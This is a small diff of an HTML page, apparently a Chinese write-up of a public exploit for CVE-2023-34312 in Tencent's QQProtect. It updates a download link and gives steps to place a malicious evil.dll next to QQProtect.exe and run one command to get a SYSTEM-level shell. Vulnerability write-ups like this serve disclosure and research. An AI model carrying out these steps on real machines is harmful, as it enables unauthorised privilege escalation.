@@ -288,8 +288,8 @@
 <p>你会得到两个 DLL：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">target\release\tinyxml.dll<br>target\release\evil.dll<br></code></pre></td></tr></table></figure>
 
-<p>或从 <a target="_blank" rel="noopener" href="https://github.com/savfile/CVE-2023-34312/releases">这里</a> 下载已编译好的版本。</p>
-<p>然后把上面的两个 Dll 和 <code>%ProgramFiles(x86)%\Common Files\Tencent\QQProtect\bin\QQProtect.exe</code> 一起放在一个文件夹里。</p>
+<p>或从 <a target="_blank" rel="noopener" href="https://github.com/savfile/CVE-2023-34312/releases/tag/v0.0.0-alpha">这里</a> 下载已编译好的版本。</p>
+<p>然后把上面的两个 DLL 和 <code>%ProgramFiles(x86)%\Common Files\Tencent\QQProtect\bin\QQProtect.exe</code> 一起放在一个文件夹里。</p>
 <p>最后用一条命令获得带有 <code>NT Authority\SYSTEM</code> 权限的外壳：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">QQProtect.exe &lt;PATH TO evil.dll&gt;<br></code></pre></td></tr></table></figure>
 
